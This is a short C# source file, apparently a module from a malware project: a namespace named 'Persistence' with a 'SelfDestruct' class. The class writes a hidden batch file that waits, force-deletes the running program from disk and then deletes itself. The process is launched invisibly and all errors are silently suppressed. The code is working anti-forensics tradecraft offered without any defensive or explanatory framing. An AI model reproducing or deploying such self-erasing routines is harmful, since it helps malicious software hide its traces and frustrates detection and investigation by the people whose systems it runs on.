using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Persistence
{
    internal class SelfDestruct
    {
        private static void InitiateSelfDestructSequence()
        {
            try
            {
                string batch = Path.GetTempFileName() + ".bat";
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 3 > NUL");
                    sw.WriteLine("CD " + Application.StartupPath);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }
                Process.Start(new ProcessStartInfo()
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }
    }
}
